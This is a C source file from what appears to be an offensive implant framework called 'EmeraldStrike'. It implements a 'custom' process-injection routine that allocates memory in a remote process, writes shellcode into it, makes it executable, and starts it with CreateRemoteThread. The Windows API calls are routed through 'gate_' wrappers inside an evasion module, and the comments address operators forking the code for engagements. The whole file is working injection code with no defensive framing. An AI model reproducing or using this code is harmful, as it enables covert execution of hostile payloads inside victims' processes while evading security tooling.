// EmeraldStrike - Operator-defined custom injection technique
// Base scaffold: same alloc/write/protect/exec flow as CRT but kept as a
// separate translation unit so operators can fork it without touching the
// other techniques. Replace the body with the engagement-specific chain.
#include "evasion/injection.h"
#include "common.h"
#include "config.h"

#if INJECTION_TECHNIQUE == INJECT_CUSTOM

HANDLE inject_custom(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step) {
    if (step) *step = 21;
    LPVOID remote = gate_VirtualAllocEx(inst, hProcess, NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) return NULL;

    if (step) *step = 22;
    SIZE_T written = 0;
    gate_WriteProcessMemory(inst, hProcess, remote, shellcode, sc_len, &written);

    if (step) *step = 23;
    DWORD old_protect = 0;
#if defined(INCLUDE_EVASION_SMARTINJECT) && !defined(EVASION_USERWX)
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READ, &old_protect);
#else
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READWRITE, &old_protect);
#endif

    if (step) *step = 24;
    return gate_CreateRemoteThread(inst,
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
}

#endif // INJECT_CUSTOM
